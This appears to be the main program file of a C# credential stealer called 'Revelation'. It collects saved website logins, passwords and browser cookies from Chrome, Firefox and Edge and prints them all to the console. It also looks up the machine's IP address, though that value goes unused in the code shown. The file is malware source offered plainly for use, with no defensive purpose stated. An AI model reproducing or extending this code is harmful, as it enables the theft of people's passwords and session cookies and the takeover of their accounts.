using Revelation.firefox.utils;
using Revelation.passwords;
using Revelation.passwords.utils_firefox;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Revelation
{
    class Program
    {
        static void Main(string[] args)
        {
            start();
        }

        public static void start()
        {

            var ip_adress = new IpAdress().get();


            var passwords = get_all_passwords();
            var cookies = get_all_cookies();


            foreach (var password in passwords)
            {
                Console.WriteLine("url : " + password.hostname);
                Console.WriteLine("login : " + password.username);
                Console.WriteLine("password : " + password.password);
                Console.WriteLine("-------------------------------------------------------------");
            }
            Console.Read();

            foreach (var cookie in cookies)
            {
                Console.WriteLine("name : " + cookie.name);
                Console.WriteLine("path : " + cookie.path);
                Console.WriteLine("value : " + cookie.value);
                Console.WriteLine("expire : " + cookie.expiresutc);
                Console.WriteLine("hotskey : " + cookie.hostname);
                Console.WriteLine("is secure : " + cookie.issecure);
                Console.WriteLine("skey : " + cookie.key);
                Console.WriteLine("-------------------------------------------------------------");
            }

            Console.Read();
        }


        public static List<Password> get_all_passwords()
        {
            var passwords = new List<Password>();
            try
            {
                var passwords_chrome = PasswordsChrome.Get();
                var passwords_firefox = PasswordsFirefox.Get(Profile.GetMozillaBrowser());
                var passwords_edge = PasswordsEdge.Get();

                passwords = passwords_chrome.Concat(passwords_firefox).Concat(passwords_edge).ToList();
                
            }
            catch(Exception e){
                Console.WriteLine(e.Message);
            }

            return passwords;
        }

        public static List<Cookie> get_all_cookies()
        {
            var cookies = new List<Cookie>();
            try
            {
                var cookies_chrome = CookiesChrome.Get();
            var cookies_firefox = CookiesFirefox.Get(Profile.GetMozillaBrowser());
            var cookies_edge = CookiesEdge.Get();

            cookies = cookies_chrome.Concat(cookies_firefox).Concat(cookies_edge).ToList();
            }
            catch { }

            return cookies;
        }

       
    }
}
